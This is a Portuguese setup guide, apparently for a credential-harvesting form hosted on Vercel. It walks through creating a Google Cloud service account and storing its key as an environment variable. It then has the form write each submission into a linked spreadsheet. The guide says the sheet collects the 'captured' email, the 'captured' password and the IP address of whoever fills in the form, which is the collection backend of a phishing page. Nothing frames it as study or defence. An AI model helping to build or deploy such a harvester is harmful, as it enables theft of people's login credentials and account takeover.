# 📊 Como Configurar Google Sheets

As credenciais serão salvas automaticamente no seu Google Sheets quando alguém preencher o formulário!

## 🔧 Passo a Passo

### 1. Criar Service Account no Google Cloud

1. Acesse: https://console.cloud.google.com/
2. Crie um novo projeto ou selecione um existente
3. Vá em **APIs & Services** → **Library**
4. Procure por "Google Sheets API" e **ative**
5. Vá em **APIs & Services** → **Credentials**
6. Clique em **Create Credentials** → **Service Account**
7. Dê um nome (ex: "sheets-writer") e clique em **Create**
8. Pule a etapa de roles (opcional) e clique em **Done**
9. Clique no service account criado
10. Vá na aba **Keys**
11. Clique em **Add Key** → **Create new key**
12. Escolha **JSON** e baixe o arquivo

### 2. Compartilhar a Planilha com o Service Account

1. Abra o arquivo JSON baixado
2. Copie o valor do campo `client_email` (algo como: `sheets-writer@projeto.iam.gserviceaccount.com`)
3. Abra sua planilha: https://docs.google.com/spreadsheets/d/1VVUU_dCw-97FzKPquvgMsj9RncNsdxbG79zsOy5pQNI/edit
4. Clique no botão **Compartilhar** (canto superior direito)
5. Cole o email do service account
6. Dê permissão de **Editor**
7. Clique em **Enviar**

### 3. Configurar na Vercel

1. Abra o arquivo JSON que você baixou
2. Copie **todo o conteúdo** do JSON
3. Na Vercel, vá em **Settings** → **Environment Variables**
4. Adicione uma nova variável:
   - **Nome:** `GOOGLE_SERVICE_ACCOUNT_JSON`
   - **Valor:** Cole todo o conteúdo do JSON (uma linha só, sem quebras)
5. Salve

### 4. Estrutura da Planilha

A planilha será criada automaticamente com as colunas:
- **Timestamp** - Data e hora
- **email** - Email capturado
- **Password** - Senha capturada
- **IP Address** - IP de origem

## ✅ Testar

Após configurar:
1. Faça um teste preenchendo o formulário
2. Verifique sua planilha - a nova linha deve aparecer automaticamente!

## 🔒 Segurança

- O Service Account tem acesso apenas à planilha que você compartilhar
- As credenciais ficam seguras nas variáveis de ambiente da Vercel
- Apenas você tem acesso à planilha

## 🚨 Troubleshooting

**Erro: "The caller does not have permission"**
- Verifique se compartilhou a planilha com o email do service account
- Verifique se deu permissão de Editor

**Erro: "API not enabled"**
- Verifique se ativou a Google Sheets API no Google Cloud Console

**Nada aparece na planilha**
- Verifique os logs da Vercel em **Functions** → **Logs**
- Verifique se a variável `GOOGLE_SERVICE_ACCOUNT_JSON` está configurada corretamente

## 📝 Exemplo do JSON

O arquivo JSON deve ter esta estrutura:
```json
{
  "type": "service_account",
  "project_id": "seu-projeto",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
  "client_email": "sheets-writer@projeto.iam.gserviceaccount.com",
  "client_id": "...",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  ...
}
```

**Importante:** Ao colar na Vercel, deve ser tudo em uma linha ou usar `\n` para quebras de linha.
